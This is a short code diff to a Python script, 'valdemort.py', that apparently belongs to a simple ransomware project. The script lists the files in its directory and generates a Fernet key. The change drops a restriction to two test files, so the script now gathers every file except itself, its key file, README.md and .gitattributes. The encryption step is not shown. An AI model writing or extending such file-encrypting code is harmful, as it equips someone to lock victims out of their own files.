@@ -6,12 +6,11 @@ files = []
 #print(os.listdir())
 
 for file in os.listdir():
-    if file == 'valdemort.py':
+    if file == 'valdemort.py' or file == '.gitattributes' or file == 'README.md':
         continue
     if file != "thekey.key":
         if os.path.isfile(file):
-            if file == 'ola.txt' or file == 'img.jpg':
-                files.append(file)
+            files.append(file)
 
 key = Fernet.generate_key()
 print(key)
